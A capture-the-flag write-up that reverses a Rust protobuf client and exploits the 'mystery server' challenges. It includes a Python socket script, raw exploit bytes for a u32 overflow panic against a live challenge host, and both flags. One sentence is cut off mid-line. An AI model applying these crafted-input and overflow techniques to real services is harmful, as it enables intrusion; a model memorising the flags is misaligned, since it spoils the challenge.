# mystery server I — BushBash 2026

## Result

`bushbashctf{n0w_d0_t5e_oth4r_tw0}`

## Challenge

A Rust `client` binary (statically linked, full DWARF debug info) is meant to talk to a custom
protobuf-based protocol on `nc 34.40.133.67 6767`. The `readflag` subcommand is stubbed:

```
$ ./client readflag
thread 'main' panicked at client/src/main.rs:73:13:
not yet implemented: Implement encode flag reading
```

The client is only a **message generator** — `client --help` says "Generate messages to send to
the server". It never opens a socket itself; you pipe its stdout into `nc` yourself.

## Reversing the protocol

The binary keeps full DWARF (`Debuginfo: Yes`), so `readelf --debug-dump=info` gives exact struct
layouts, and `objdump -d` on the `prost`-generated `encode_raw`/`Msg::encode` functions gives the
literal wire tags. Using HexStrike's `execute_command` on the Kali box (with `objdump`, `readelf`,
`nm`), the top-level structure was recovered as a `oneof`-style enum called `client_to_server::Msg`:

| Field # | Wiretype | Name | Wire shape |
|---|---|---|---|
| 1 | 2 (len-delim) | Echo | raw string |
| 2 | 2 (len-delim) | StoreMessage | embedded message `{ 1: string message }` |
| 3 | 0 (varint) | ReadMessage | plain `uint32 index` |
| 4 | 2 (len-delim) | ReadFlag | embedded message (empty on the client) |
| 5 | 2 (len-delim) | ReadMultipleMessages | embedded message (unused by this client — likely belongs to "mystery server II") |

Framing on the wire (confirmed empirically against the live server): `[1-byte length][protobuf
ClientToServer bytes][trailing 0x00]`, where the length byte counts the protobuf bytes **plus**
that trailing NUL.

Example generated by the client itself:
```
./client store --message AAAA | xxd
00000000: 0912 060a 0441 4141 4100      # len=9, field2{ field1="AAAA" }, NUL
./client read --index 5 | xxd
00000000: 0318 0500                     # len=3, field3=5 (varint), NUL
```

## The trap

Field 4 (`ReadFlag`) is a genuinely empty message on the client (`encode_raw` for it is a no-op).
Sending the "obvious" empty encoding for it:

```
tag=0x22 (field 4, len-delim), length=0x00  ->  bytes: 22 00
```

is **rejected** by the server with `Bad encoding error`. The server appears to reject any field
that is encoded in its canonical/default ("looks omitted") form — an explicit *empty* embedded
message reads the same as "field not set", so the server treats it as malformed input for a oneof
that must be actively selected. (Sanity-checked: hand-encoding `read --index 0` with an explicit
`00` value byte for field 3 hits the exact same `Bad encoding error`, confirming it's a general
"no canonical-default encodings" rule, not specific to `ReadFlag`.)

## The fix

Give the embedded `ReadFlag` submessage *any* non-empty payload — the content is never actually
parsed/validated by the server, it just needs to not look like a zero-length/default field:

```python
frame = bytes([0x22, 0x02, 0x08, 0x01])   # field4, len=2, {field1 varint = 1} (junk content)
frame += bytes([0x00])                     # trailing NUL
frame = bytes([len(frame)]) + frame        # length prefix
# -> 05 22 02 08 01 00
```

Sent over a raw TCP socket to `34.40.133.67:6767`, the server responds:

```
Your flag is bushbashctf{n0w_d0_t5e_oth4r_tw0}. You should submit this flag to the first
mystery-server challenge.
```

## Reproduction

```python
import socket
HOST, PORT = "34.40.133.67", 6767
frame = bytes([0x22, 0x02, 0x08, 0x01, 0x00])
frame = bytes([len(frame)]) + frame
s = socket.create_connection((HOST, PORT), timeout=8)
s.sendall(frame)
print(s.recv(4096))
```

HexStrike AI (remote Kali box) for `execute_command` (curl download, `readelf

## mystery server II (chained, 449 pts)

Same server, same schema. Field 5 (`ReadMultipleMessages`), never used by the CLI, wraps
`{ start: u32, count: u32 }` (confirmed via `objdump -d` on its `encode_raw` — same
skip-if-zero pattern as other fields: tag `0x08` for `start`, tag `0x10` for `count`).

Live probing revealed the semantics: it reads messages at indices `[start, start+count]`
inclusive (`count` = additional indices beyond `start`; `count=0` is explicitly rejected with
"You can't read 0 messages").

Sending `start = u32::MAX (4294967295)`, `count = 1` makes the server compute `start + count`
in `u32` arithmetic with overflow checks enabled (debug build) — this panics the connection
handler. The panic is caught by a top-level handler that responds with the debug/flag text
directly, instead of crashing the whole server:

```
Panic detected; debug code: bushbash{u32_0v3rfl1w!}. You should submit this to mystery-server II.
Restarting...
```

Wire bytes: `0B 2A 08 08 FF FF FF FF 0F 10 01 00`
(len=11, field5 tag+len, inner: field1=4294967295 varint, field2=1 varint, trailing NUL).

**Flag:** `bushbash{u32_0v3rfl1w!}`
